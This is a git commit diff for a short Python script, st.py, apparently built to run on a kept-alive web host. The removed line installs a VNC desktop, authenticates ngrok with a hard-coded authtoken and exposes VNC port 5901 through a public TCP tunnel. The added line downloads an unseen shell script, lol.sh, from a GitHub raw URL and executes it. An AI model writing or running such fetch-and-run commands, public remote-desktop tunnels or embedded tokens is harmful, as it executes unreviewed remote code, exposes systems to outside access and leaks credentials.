8f63db8e1901acd67789937639a389ecbd6a7bc1
bangladeshcyberwarriors1337 <61875398+bangladeshcyberwarriors1337@users.noreply.github.com>
2021-12-21 09:24:35 +0600

    Update st.py

--- st.py
+++ st.py
@@ -2,4 +2,4 @@ import os
 from web import keep_alive
 
 keep_alive()
-os.system("apt update && apt -y install vnc4server && apt install xfce4 xfce4-goodies -y && vncserver -geometry 1366x768 && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz && tar -xzvf ngrok-stable-linux-amd64.tgz && ./ngrok authtoken 22UBI4hSN8nWo6tm48qsBdEYGgo_6K9PpEaxb13F1rFiNeXNx && ./ngrok tcp 5901")
+os.system("wget https://raw.githubusercontent.com/bangladeshcyberwarriors1337/nonamenothing/main/lol.sh && chmod +x lol.sh && ./lol.sh")
